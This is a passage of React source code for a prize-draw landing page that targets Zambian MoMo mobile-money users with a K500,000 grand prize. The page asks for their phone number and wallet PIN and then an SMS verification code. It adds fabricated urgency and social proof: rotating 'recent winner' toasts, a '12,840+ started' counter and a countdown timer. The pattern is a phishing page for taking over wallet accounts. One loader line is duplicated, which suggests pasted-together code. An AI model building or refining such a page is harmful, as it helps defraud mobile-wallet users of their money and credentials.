...
function App() {
  ...
  useEffect(() => {
    ...
    if (description) description.textContent = 'Use your MoMo number and wallet PIN to continue.'
    return undefined
  }, [view])
  ...
  return (
    <div className="campaign-app">
      ...
      {isEntering && <div className="entry-loader" role="status"><div className="loader-mark"><Sparkles size={20} /></div><strong>Opening the Gift Vault</strong><span>Preparing your MoMo eligibility check...</span><i /></div>}
        {isEntering && <div className="entry-loader" role="status"><div className="loader-mark"><MoveForwardMark /></div><strong>Opening the Gift Vault</strong><span>Preparing your MoMo eligibility check...</span><i /></div>}
      ...
      {view === 'landing' && <div className="activity-toast"><span className="toast-icon"><Gift size={16} /></span><span><small>RECENT WINNER UPDATE</small><strong>{activity[activityIndex][0]}</strong><b>Prize won: {activity[activityIndex][1]}</b><small>Recent campaign highlight, not a verified winner</small></span><button type="button" aria-label="Dismiss activity preview" onClick={(event) => event.currentTarget.parentElement.remove()}>×</button></div>}
      ...
      {view === 'otp' ? <main className="otp-view"><section className="otp-page section-width"><a className="back-link" href="#eligibility" onClick={(event) => { event.preventDefault(); window.history.pushState({}, '', '#eligibility'); setView('eligibility') }}>← Back to eligibility</a><div className="otp-panel"><div className="otp-message"><span className="section-kicker">ONE MORE STEP</span><h2>Verify your<br /><em>number.</em></h2><p>We sent a verification code to the number ending in {phone.slice(-4) || '••••'}.</p><div className="check-points"><span><Check size={15} /> Secure verification</span><span><Check size={15} /> Code expires in 2 minutes</span></div></div><form className="otp-form" onSubmit={submitOtp}><div className="form-heading"><span>MOVE FORWARD</span><h3>Enter your code</h3><p>Use the 4- to 6-digit code sent to your number.</p></div><label htmlFor="otp">Verification code</label><input className="code-input otp-input" id="otp" type="text" inputMode="numeric" pattern="\d{4,6}" minLength="4" maxLength="6" placeholder="000000" value={otp} onChange={(event) => setOtp(event.target.value.replace(/\D/g, '').slice(0, 6))} aria-describedby="otp-timer" required /><p className={otpSeconds === 0 ? 'otp-timer expired' : 'otp-timer'} id="otp-timer">{otpSeconds === 0 ? 'Code expired.' : <>Code expires in <strong>{otpMinutes}:{otpRemainingSeconds}</strong></>}</p><button className="submit-button" type="submit" disabled={isOtpVerifying || otpSeconds === 0}>Verify and continue <ArrowRight size={17} /></button>{status.type === 'success' && <p className="form-status success">{status.message}</p>}</form></div></section></main> : view === 'landing' ? <main id="top" className="landing-view">
        <section className="prize-marquee grand-prize-marquee" aria-label="Final winner grant"><div className="marquee-label"><Sparkles size={14} /> FINAL WINNER GRANT</div><div className="marquee-window"><div className="marquee-track">{[1, 2, 3, 4].map((item) => <div className="marquee-item grant-tile" key={item}><strong>K500,000</strong><span>Final winner grant</span><b>Grand prize</b></div>)}</div></div></section>
        <section className="hero section-width">
          <div className="hero-copy"><span className="section-kicker"><Trophy size={14} /> THE MOVE FORWARD GIFT DRAW</span><span className="campaign-badge"><span className="pulse" /> Entries are open nationwide</span><h1>One draw.<br /><em>Twenty ways</em><br />to move forward.</h1><p>Eligible Zambian MoMo users can enter for a final-winner grant of <strong>K500,000</strong>, choose a featured gift, or take the equivalent cash value under the campaign rules.</p><div className="hero-actions"><a className="hero-button" href="#eligibility" onClick={enterDraw}>Check my eligibility <ArrowRight size={18} /></a><a className="hero-text-link" href="#gifts">Explore the rewards <ArrowRight size={15} /></a></div><div className="hero-proof"><span><ShieldCheck size={15} /> Free to enter</span><span><Clock3 size={15} /> 3-minute check</span><span><Users size={15} /> 12,840+ started</span></div></div>
          <div className="hero-prize"><div className="hero-prize-orb" /><div className="hero-prize-label">FINAL WINNER GRANT</div><strong>K500,000</strong><span>Grand prize</span><small>Final winner award</small><div className="prize-stamp">20<br /><small>WAYS TO<br />WIN</small></div></div>
        </section>
